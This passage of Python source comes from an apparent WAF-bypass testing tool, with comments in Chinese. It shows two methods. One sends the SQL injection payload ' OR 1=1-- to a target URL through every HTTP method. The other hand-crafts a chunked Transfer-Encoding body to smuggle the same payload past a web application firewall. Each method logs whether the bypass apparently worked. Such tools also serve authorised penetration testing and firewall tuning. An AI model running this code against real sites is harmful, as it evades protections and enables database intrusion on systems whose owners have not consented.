    def test_http_method_bypass(self) -> List[BypassResult]:
        """测试 HTTP 方法绕过"""
        logging.info("[*] 测试 HTTP 方法绕过...")
        results = []

        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
        attack_payload = "' OR 1=1--"

        for method in methods:
            try:
                if method == "GET":
                    resp = self.session.get(
                        self.config.target_url,
                        params={self.config.parameter: attack_payload},
                        timeout=self.config.timeout,
                    )
                else:
                    resp = self.session.request(
                        method,
                        self.config.target_url,
                        data={self.config.parameter: attack_payload},
                        timeout=self.config.timeout,
                    )

                bypassed = resp.status_code == 200 and len(resp.text) > 500
                if bypassed:
                    logging.info(f"  [+] HTTP 方法绕过: {method}")

                results.append(BypassResult(
                    technique=BypassTechnique.HTTP_METHOD,
                    payload=f"{method} {attack_payload}",
                    bypassed=bypassed,
                    waf_vendor=self.waf_info.vendor,
                    bypass_status_code=resp.status_code,
                    bypass_response_length=len(resp.text),
                ))

            except requests.RequestException:
                pass
            time.sleep(self.config.delay)

        return results

    def test_chunked_transfer(self) -> List[BypassResult]:
        """测试分块传输绕过"""
        logging.info("[*] 测试分块传输绕过...")
        results = []

        attack_payload = "' OR 1=1--"

        # 标准分块传输
        try:
            headers = {
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            # 手动构造分块数据
            body_parts = []
            for i, char in enumerate(attack_payload):
                body_parts.append(f"1\r\n{char}\r\n")
            body_parts.append("0\r\n\r\n")
            chunked_body = "".join(body_parts)

            resp = self.session.post(
                self.config.target_url,
                data=chunked_body,
                headers=headers,
                timeout=self.config.timeout,
            )

            bypassed = resp.status_code == 200 and len(resp.text) > 500
            results.append(BypassResult(
                technique=BypassTechnique.CHUNKED_TRANSFER,
                payload=f"Chunked: {attack_payload}",
                bypassed=bypassed,
                waf_vendor=self.waf_info.vendor,
                bypass_status_code=resp.status_code,
                bypass_response_length=len(resp.text),
            ))

        except requests.RequestException:
            pass

        return results

